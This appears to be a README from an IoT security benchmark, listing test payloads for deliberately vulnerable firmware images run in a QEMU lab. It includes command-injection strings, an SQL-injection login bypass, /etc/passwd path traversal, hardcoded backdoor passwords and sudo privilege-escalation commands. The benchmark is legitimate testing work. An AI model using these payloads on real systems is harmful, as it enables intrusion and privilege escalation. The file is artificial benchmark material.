# Francesco Scenario Payloads

All vulnerability scenarios listed in this document were implemented by
Francesco in the IoTBench repository. The corresponding catalog rows use
`OWNER = Francesco`, `Implemented = V`, and one implemented test per firmware
scenario.

The complete 34-image benchmark index, including the shared CWE-78 device
scenarios, is in [device-payloads.md](device-payloads.md).

These payloads are for the intentionally vulnerable IoTBench firmware images
only. Boot each image in an isolated QEMU lab and use the dashboard at
`http://127.0.0.1:8080` unless the row says that a guest console is required.

Start a scenario from the repository root in the first terminal:

```bash
FIRMWARE=<firmware-id> ./scripts/run-qemu.sh
```

Run the row's payload from a second terminal or through the dashboard. The
runner automatically forwards SSH to `127.0.0.1:2222` and the vulnerable TCP
service to `127.0.0.1:9090` for the images that require them.

| Firmware id | Catalog scenario | Payload / exploit indicator | Expected signal |
| --- | --- | --- | --- |
| `router-cwe276-leaked-private-key` | Incorrect default key permissions | HTTP GET `/debug/device-private.key`. | The world-readable key can be read by Lighttpd and the response starts with `-----BEGIN PRIVATE KEY-----`. |
| `router-cwe276-bad-chown-rights` | Incorrect default policy permissions | From the serial console: `su -s /bin/sh routerweb -c "printf 'DNS_OVERRIDE=attacker-controlled\n' > /etc/iotbench/wan-policy.conf"`. | A non-privileged service account modifies a root-consumed policy. |
| `router-cwe798-ld-preload-sudo` | Hardcoded support credential | SSH to `routerweb@127.0.0.1` on port 2222 with password `iotbench`, then run `sudo LD_PRELOAD=/usr/lib/iotbench/preload-marker.so /usr/bin/ldpreload-target` using the same password. | The shared credential is identical in every image and `/tmp/iotbench-ldpreload-root` records euid 0. |
| `router-cwe798-vi-privilege-escalation` | Hardcoded maintenance credential | SSH to `routerweb@127.0.0.1` on port 2222 with password `iotbench`, then run `sudo /bin/busybox vi /tmp/iotbench-vi.txt` using the same password. | The firmware-wide credential authorizes the vendor editor workflow. |
| `router-cwe078-writable-root-cron` | Root cron command injection | From the serial console: `su -s /bin/sh routerweb -c "printf 'router; id > /tmp/iotbench-cron-root\n' > /var/lib/router-dashboard/maintenance-target"`; wait one minute. | Unsanitized input enters a root shell command and the marker contains root `id` output. |
| `router-cwe287-ssh-hardcoded-backdoor` | SSH server with hardcoded backdoor | Guest console or an added QEMU port forward: `ssh support@<guest-ip>` with password `iotbench`. | A hardcoded `support` account exists and is accepted by the SSH service. |
| `router-cwe089-http-sqli-auth` | Exploitable HTTP auth / SQL injection | Dashboard username `admin`, password `' OR '1'='1`. | The vulnerable query returns the `admin` role without the real password. |
| `router-cwe078-bash-command-injection` | Vulnerable Bash files / command injection | Dashboard target `127.0.0.1; id`. | Output includes `uid=995(routerweb)` after the diagnostic text. |
| `router-cwe077-c-command-injection` | Vulnerable C binaries / command injection | Dashboard target `router; id`. | Output includes `uid=995(routerweb)`. |
| `router-cwe416-use-after-free` | Use after free | Dashboard replacement object `role=admin;device=router`. | Helper prints `ACCESS GRANTED via freed object reuse`. |
| `router-cwe400-diagnostic-dos` | Denial of service | Dashboard megabytes `128` on the default 256 MB QEMU image; increase only inside disposable labs. | The helper allocates/touches attacker-selected memory or fails under memory pressure. |
| `router-cwe078-service-interface-injection` | Command injection via service interface | Dashboard probe `status; id`; guest console equivalent: `printf 'status; id\n' \| nc 127.0.0.1 9090`. | The TCP service response includes `uid=995(routerweb)`. |
| `router-cwe022-path-traversal` | Path traversal | HTTP GET `/missing/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd`. | The Lighttpd 404 fallback double-decodes the path and returns `/etc/passwd`. |

For direct API reproduction, first load `/` and read the
`meta[name="dashboard-token"]` value, then POST JSON to `/api.php` with header
`X-Dashboard-Token: <token>`. The dashboard forms already perform that step.

The existing catalog identifiers are intentionally preserved. CWE-287 is a
valid parent classification for the hardcoded support-account authentication
failure, while CWE-77 is the parent of the OS command-injection specialization
CWE-78. The two CWE-798 images now require their shared firmware credential;
their sudo configuration is the post-authentication impact path, not the CWE
classification by itself.

## Device-specific scenarios

These additional images reproduce CVE-inspired weaknesses on realistic device
interfaces. Start the selected image with `scripts/run-qemu.sh`, then execute
the matching dependency-free client from another terminal.

| Firmware id | Payload command | Expected signal |
| --- | --- | --- |
| `ipcamera-cwe022-recording-path-traversal` | `python3 scripts/exploit-device-cve-scenarios.py ipcamera` | The recording CGI returns `/etc/passwd`. |
| `smartplug-cwe862-missing-authorization` | `python3 scripts/exploit-device-cve-scenarios.py smartplug` | Relay state changes with `actor=guest` and `authorization=skipped`. |
| `thermostat-cwe294-command-replay` | `python3 scripts/exploit-device-cve-scenarios.py thermostat` | The same authenticated sequence is accepted twice. |
| `smartbulb-cwe122-zcl-heap-overflow` | `python3 scripts/exploit-device-cve-scenarios.py smartbulb` | The ZCL parser reports `HEAP_OVERFLOW`. |
| `smarthub-cwe121-database-stack-overflow` | `python3 scripts/exploit-device-cve-scenarios.py smarthub` | The database lookup reports `STACK_OVERFLOW`. |
| `envsensor-cwe306-unauthenticated-calibration` | `python3 scripts/exploit-device-cve-scenarios.py envsensor` | Calibration changes with `authenticated=no`. |
| `smartspeaker-cwe122-id3-heap-overflow` | `python3 scripts/exploit-device-cve-scenarios.py smartspeaker` | The ID3 parser reports `HEAP_OVERFLOW`. |
| `healthmonitor-cwe200-memory-disclosure` | `python3 scripts/exploit-device-cve-scenarios.py healthmonitor` | The service discloses synthetic patient data. |
| `doorlock-cwe294-unlock-replay` | `python3 scripts/exploit-device-cve-scenarios.py doorlock` | The same authenticated unlock sequence is accepted twice. |
| `plc-cwe121-modbus-stack-overflow` | `python3 scripts/exploit-device-cve-scenarios.py plc` | Modbus function `0x41` reports `STACK_OVERFLOW`. |

The exact wire payloads, port mappings and CVE references are recorded in
[device-payloads.md](device-payloads.md). The MQTT broker, TCP transposition of
Zigbee/BLE frames and synthetic protocol extensions are benchmark transport
fixtures; the measured weakness remains in the device application logic.
